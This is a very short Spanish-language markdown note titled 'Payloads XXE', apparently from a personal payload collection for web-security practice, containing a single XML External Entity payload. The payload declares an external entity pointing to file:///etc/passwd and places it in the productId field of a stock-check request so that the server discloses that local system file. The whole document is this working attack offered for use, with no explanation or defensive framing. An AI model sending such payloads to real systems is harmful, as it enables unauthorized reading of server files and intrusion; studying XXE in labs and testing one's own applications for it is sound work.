# Payloads XXE

## Lectura de archivo local

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockcheck [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
